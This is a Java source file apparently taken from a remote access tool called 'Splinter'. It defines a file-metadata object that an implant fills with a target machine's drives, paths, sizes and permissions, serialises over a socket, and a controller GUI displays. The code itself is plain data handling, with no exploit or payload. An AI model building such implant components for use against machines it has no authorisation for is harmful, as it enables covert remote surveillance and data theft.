/**
 * This object stores the attributes about the file sent back from the implant: file name, extension, path, size, permissions, etc 
 *
 * @author Solomon Sonya 
 */

package Controller.GUI;

import java.io.File;
import java.util.Date;
import java.util.Vector;

import Implant.Driver;

public class Object_FileBrowser 
{
	public static final String strMyClassName = "Object_FileBrowser"; 
	
	public String myFile_UpDirectory = Driver.fileSeperator;
	
	public String myFile_isDrive = " - ";
	public String myFile_fle = " - "; 
	public String myFile_driveDisplayName = " - "; 
	public String myFile_isFileSystem = " - "; 
	public String myFile_isFloppy = " - "; 
	public String myFile_isDirectory = " - "; 
	public String myFile_isFile = " - "; 
	public String myFile_isHidden = " - "; 
	public String myFile_isTraversable = " - "; 
	public String myFile_canRead = " - "; 
	public String myFile_canWrite = " - "; 
	public String myFile_canExecute = " - "; 
	public String myFile_fullPath = " - "; 
	public String myFile_parentDirectory = " - "; 
	public String myFile_dateLastModified_long = " - "; 
	public String myFile_totalSpace = " - "; 
	public String myFile_usableSpace = " - ";	
	public String myFile_Size = " - ";
	long myFileSize = 0;
			
	public String myFileExtension_withoutPeriod = " - ";
	public String myPermissions = "- - -";//to be converted to rwx accordingly
	public int myIndexInArrayList = 0;
	
	public boolean i_am_a_directory = false;
	public boolean i_am_a_drive = false;
	public boolean i_am_a_file = false;
	
	public volatile Vector<String> vctMyJTableData = new Vector<String>();
	
	public Object_FileBrowser(String isDrive, String fle, String driveDisplayName, String isFileSystem, String isFloppy, String isDirectory, String isFile, String isHidden, String isTraversable, String canRead, String canWrite, String canExecute, String fullPath, String parentDirectory, String dateLastModified_long, String totalSpace, String usableSpace, String fileSize, String upDirectory)
	{
		try
		{
		
			//THIS CONSTRUCTOR IS CALLED FROM THE CONTROLLER	
			myFile_isDrive = isDrive.trim();
			myFile_fle	= fle.trim() ;
			myFile_driveDisplayName = driveDisplayName.trim();
			myFile_isFileSystem = 	isFileSystem.trim();	
			myFile_isFloppy = isFloppy.trim();
			myFile_isDirectory =	isDirectory.trim()	;
			myFile_isFile = 	isFile.trim();	
			myFile_isHidden = isHidden;
			myFile_isTraversable = 	isTraversable.trim();
			myFile_canRead = canRead.trim();
			myFile_canWrite = canWrite.trim();
			myFile_canExecute = canExecute.trim();
			myFile_fullPath = fullPath.trim();
			myFile_parentDirectory = parentDirectory.trim();
			myFile_dateLastModified_long = dateLastModified_long.trim();
			myFile_totalSpace = totalSpace.trim();
			myFile_usableSpace = usableSpace.trim();
			myFile_Size = fileSize.trim();
			myFile_UpDirectory = upDirectory.trim(); 
			
			
			//
			//test if we're a drive
			//
			if(myFile_isDrive != null && (myFile_isDrive.trim().equalsIgnoreCase("true") || myFile_isDrive.trim().equalsIgnoreCase("yes")))
			{
				this.i_am_a_drive = true;
			}
			if(myFile_isDirectory != null && (myFile_isDirectory.trim().equalsIgnoreCase("true") || myFile_isDirectory.trim().equalsIgnoreCase("yes")))
			{
				this.i_am_a_directory = true;
			}
			if(myFile_isFile != null && (myFile_isFile.trim().equalsIgnoreCase("true") || myFile_isFile.trim().equalsIgnoreCase("yes")))
			{
				this.i_am_a_file = true;
			}
			
			//
			//Get file extension without the period
			//
			if(i_am_a_file)
			{
				if(myFile_driveDisplayName != null && !myFile_driveDisplayName.trim().equals("") && myFile_driveDisplayName.contains(".") && !myFile_driveDisplayName.trim().endsWith("."))
				{
					myFileExtension_withoutPeriod = myFile_driveDisplayName.substring(myFile_driveDisplayName.lastIndexOf(".")+1);
				}
			}
			
			//
			//File Size
			//
			try
			{
				this.myFileSize = Long.parseLong(this.myFile_Size.trim());
				
				//Driver.sop("Size: " + myFileSize);
				
				this.myFile_Size = Driver.getFormattedFileSize_String(myFileSize);
				
				if(myFile_Size!= null && myFile_Size.trim().startsWith("0.00"))
				{
					myFile_Size = " - ";
				}
				
			}
			catch(Exception e)
			{
				myFile_Size = " - ";
				
			}
			
			//
			//Permisions
			//
			if(this.myFile_canRead != null && (this.myFile_canRead.trim().equalsIgnoreCase("yes") || this.myFile_canRead.trim().equalsIgnoreCase("true")))
			{
				this.myPermissions = "r";
			}
			else
			{
				this.myPermissions = " - ";
			}
			
			if(this.myFile_canWrite != null && (this.myFile_canWrite.trim().equalsIgnoreCase("yes") || this.myFile_canWrite.trim().equalsIgnoreCase("true")))
			{
				this.myPermissions = myPermissions + "w";
			}
			else
			{
				this.myPermissions = myPermissions + " - ";
			}
			
			if(this.myFile_canExecute != null && (this.myFile_canExecute.trim().equalsIgnoreCase("yes") || this.myFile_canExecute.trim().equalsIgnoreCase("true")))
			{
				this.myPermissions = myPermissions + "x";
			}
			else
			{
				this.myPermissions = myPermissions + " - ";
			}
			
			//
			//Date Last Modified
			//
			try
			{
				
				
				
				Date date = new Date(Long.parseLong(this.myFile_dateLastModified_long.trim()));				
				myFile_dateLastModified_long = date.toString();
				
			}catch(Exception e){}
			
			//Driver.sop("Parent: " + myFile_parentDirectory);
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor called by Controller", this.strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}

	public Object_FileBrowser(boolean isDrive, File fle, String driveDisplayName, boolean isFileSystem, boolean isFloppy,	boolean isDirectory, boolean isFile, boolean isHidden, Boolean isTraversable, boolean canRead, boolean canWrite, boolean canExecute, String fullPath, File parentDirectory, long dateLastModified_long, long totalSpace, long usableSpace, long fileSize) 
	{
		try
		{
			//THIS CONSTRUCTOR IS CALLED FROM Splinter_IMPLANT
	
			//add blank space to ensure delimeters are clearly defined by the controller
			
			//DRIVE
			if(isDrive)
			{
				myFile_isDrive = "yes";
			}
			else
			{
				myFile_isDrive = "no";
			}
			
			//FILE
			if(fle == null)
			{
				myFile_fle = "unk";
			}
			else
			{
				myFile_fle = " "+fle;
			}
			
			//myFile_driveDisplayName
			if(driveDisplayName == null)
			{
				myFile_driveDisplayName = "unk";
			}
			
			else if(driveDisplayName.trim().equals(""))
			{
				myFile_driveDisplayName = " - ";
			}		
			else
			{
				myFile_driveDisplayName = " " + driveDisplayName;
			}
			
			//isFileSystem
			if(isFileSystem)
			{
				myFile_isFileSystem = "yes";
			}
			else
			{
				myFile_isFileSystem = "no";
			}
			
			//myFile_isFloppy
			if(isFloppy)
			{
				myFile_isFloppy = "yes";
			}
			else
			{
				myFile_isFloppy = "no";
			}
			
			//myFile_isDirectory
			if(isDirectory)
			{
				myFile_isDirectory = "yes";
			}
			else
			{
				myFile_isDirectory = "no";
			}
			
			//myFile_isFile
			if(isFile)
			{
				myFile_isFile = "yes";
			}
			else
			{
				myFile_isFile = "no";
			}
			
			//myFile_isHidden
			if(isHidden)
			{
				myFile_isHidden = "yes";
			}
			else
			{
				myFile_isHidden = "no";
			}
			
			//myFile_isTraversable
			if(isTraversable)
			{
				myFile_isTraversable = "yes";
			}
			else
			{
				myFile_isTraversable = "no";
			}
			
			//myFile_canRead
			if(canRead)
			{
				myFile_canRead = "yes";
			}
			else
			{
				myFile_canRead = "no";
			}
			
			//myFile_canWrite
			if(canWrite)
			{
				myFile_canWrite = "yes";
			}
			else
			{
				myFile_canWrite = "no";
			}
			
			//myFile_canExecute
			if(canExecute)
			{
				myFile_canExecute = "yes";
			}
			else
			{
				myFile_canExecute = "no";
			}
			
			//myFile_fullPath
			if(fullPath == null)
			{
				myFile_fullPath = "unk";
			}
			else
			{
				myFile_fullPath = " " + fullPath;
			}
			
			//myFile_parentDirectory
			if(parentDirectory == null)
			{
				myFile_parentDirectory = Driver.fileSeperator;
			}
			else
			{
				myFile_parentDirectory = " "+parentDirectory;
				
				if(myFile_parentDirectory.trim().equalsIgnoreCase("Computer"))
				{
					myFile_parentDirectory = Driver.fileSeperator;
				}
				
				//we're going to have to implement our own parent directory, it's not going back as i wanted
				if(myFile_fullPath.contains(":" + Driver.fileSeperator))
				{
					myFile_parentDirectory = myFile_fullPath.substring(0, myFile_fullPath.lastIndexOf(Driver.fileSeperator));
				}
				
				//set the up directory as well!
				if(myFile_parentDirectory.length() > 1 && myFile_parentDirectory.contains(Driver.fileSeperator))
				{
					this.myFile_UpDirectory = myFile_parentDirectory.substring(0, myFile_parentDirectory.lastIndexOf(Driver.fileSeperator));
				}
				else
				{
					myFile_UpDirectory = myFile_parentDirectory;
				}
								
				//Driver.sop("myFile_parentDirectory: " + myFile_parentDirectory);
				//Driver.sop("myFile_UpDirectory: " + myFile_UpDirectory);
			}
			
			//myFile_dateLastModified_long
			if(dateLastModified_long < 0)
			{
				myFile_dateLastModified_long = "0";
			}
			else
			{
				myFile_dateLastModified_long = " " + dateLastModified_long;
			}
			
			//myFile_totalSpace
			if(totalSpace < 0)
			{
				myFile_totalSpace = "0";
			}
			else
			{
				myFile_totalSpace = " " + totalSpace;
			}
			
			//myFile_usableSpace
			if(usableSpace < 0)
			{
				myFile_usableSpace = "0";
			}
			else
			{
				myFile_usableSpace = " " + usableSpace;
			}
			
			//myFile_Size
			if(fileSize < 0)
			{
				myFile_Size = "0";
			}
			else
			{
				myFile_Size = " " +fileSize;
			}
		}
		catch(Exception e)
		{
			Driver.eop("Constructor mtd called from Implant", this.strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		
	}
	
	public Vector<String> getJTableRowData()
	{
		try	{	this.vctMyJTableData.clear();}	catch(Exception e){}
				
		this.vctMyJTableData.add(myFileExtension_withoutPeriod);
		this.vctMyJTableData.add(myFile_driveDisplayName);
		this.vctMyJTableData.add(this.myFile_fullPath);
		this.vctMyJTableData.add(this.myFile_Size);
		this.vctMyJTableData.add(this.myPermissions);
		this.vctMyJTableData.add(this.myFile_dateLastModified_long);
		this.vctMyJTableData.add(""+this.myIndexInArrayList);
		
		return this.vctMyJTableData;
	}
	
	/**
	 * Call this method to harvest data from this file object to be sent over to the controller
	 * 
	 * THIS IS CALLED BY THE IMPLANT TO SEND OVER TO THE CONTROLLER GUI
	 * 
	 * @return
	 */
	public String getFileObjectData_Socket(String delimeter)
	{
		String myLine = "UNKNOWN";
		
		try
		{
					myLine = "" + 	myFile_isDrive 				+ delimeter +
									myFile_fle 					+ delimeter +
									myFile_driveDisplayName		+ delimeter +
									myFile_isFileSystem			+ delimeter +
									myFile_isFloppy				+ delimeter +
									myFile_isDirectory			+ delimeter +
									myFile_isFile				+ delimeter +
									myFile_isHidden				+ delimeter +
									myFile_isTraversable		+ delimeter +
									myFile_canRead				+ delimeter +
									myFile_canWrite				+ delimeter +
									myFile_canExecute			+ delimeter +
									myFile_fullPath				+ delimeter +
									myFile_parentDirectory		+ delimeter +
									myFile_dateLastModified_long+ delimeter +
									myFile_totalSpace			+ delimeter +
									myFile_usableSpace			+ delimeter +			
									myFile_Size					+ delimeter +
									myFile_UpDirectory;
									
			return myLine;						
									
		}
		catch(Exception e)
		{
			Driver.eop("getFileObjectData_Socket", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return "UNKNOWN";
	}
	
	/**
	 * get JList Formatted Data
	 * 
	 * THIS IS CALLED FROM THE CONTROLLER FOR THE GUI
	 */
	String getJList_FileRoots()
	{
		return " " + myFile_fle + " \t" + myFile_driveDisplayName ;
	}
	
	
	
	

}
